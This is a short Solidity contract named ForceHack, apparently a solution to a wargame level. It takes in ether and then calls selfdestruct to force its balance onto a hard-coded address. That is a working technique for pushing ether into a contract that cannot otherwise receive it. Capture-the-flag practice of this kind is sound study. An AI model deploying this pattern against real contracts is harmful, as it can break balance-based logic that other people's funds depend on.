pragma solidity ^0.6.0;

contract ForceHack{

    function collect() public payable returns (uint){
        return address(this).balance;
    }

    function selfDest() public {
        address payable refundAddr = 0x72066485510a2C57880802CB10134153886fE88c;
        selfdestruct(refundAddr);
    }

}